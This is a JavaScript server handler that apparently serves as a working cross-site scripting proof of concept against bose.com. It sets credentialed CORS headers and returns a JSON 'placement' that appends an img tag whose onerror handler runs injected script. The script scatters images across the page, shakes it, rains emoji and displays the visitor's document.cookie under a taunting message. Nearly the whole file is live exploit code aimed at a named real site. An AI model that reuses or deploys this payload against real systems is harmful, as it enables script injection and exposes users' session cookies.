export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://www.bose.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  res.status(200).json([
    {
      placement: {
        anchor: 'body',
        mode: 'append'
      },
      html: `
<img src=x onerror="
(function(){

  // === Poggers constrained to viewport ===
  const imgUrl = 'https://i.imgur.com/dortPBR.png';
  const SIZE = 90;

  for (let i = 0; i < 15; i++) {
    let img = document.createElement('img');
    img.src = imgUrl;
    img.style.position = 'fixed';
    img.style.width = SIZE + 'px';
    img.style.zIndex = 999999;
    img.style.transition = 'all 2.5s linear';
    document.body.appendChild(img);

    function move() {
      const maxX = window.innerWidth - SIZE;
      const maxY = window.innerHeight - SIZE;

      const x = Math.random() * maxX;
      const y = Math.random() * maxY;

      img.style.left = x + 'px';
      img.style.top = y + 'px';
      img.style.transform = 'rotate(' + Math.random()*360 + 'deg)';
    }

    move();
    setInterval(move, 2500);
  }

  // === Popup below navbar ===
  let popup = document.createElement('div');
  popup.innerText = 'ENOUGH IMPACT FOR YOU BRO?\\n\\n🍪 ' + document.cookie;
  popup.style.position = 'fixed';
  popup.style.top = '150px';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = 'black';
  popup.style.color = 'lime';
  popup.style.padding = '15px';
  popup.style.fontFamily = 'monospace';
  popup.style.zIndex = 9999999;
  popup.style.border = '3px solid red';
  popup.style.boxShadow = '0 0 15px red';
  popup.style.maxWidth = '90%';
  popup.style.wordBreak = 'break-all';
  document.body.appendChild(popup);

  // === Softer shake ===
  setInterval(() => {
    document.body.style.transform = 'rotate(' + (Math.random()*0.3 - 0.15) + 'deg)';
  }, 400);

  // === Emoji rain ===
  setInterval(() => {
    let e = document.createElement('div');
    e.innerText = '💀🔥😂';
    e.style.position = 'fixed';
    e.style.left = Math.random()*100 + '%';
    e.style.top = Math.random()*100 + '%';
    e.style.zIndex = 999999;
    document.body.appendChild(e);
    setTimeout(()=>e.remove(), 1500);
  }, 500);

})();
">
`
    }
  ]);
}
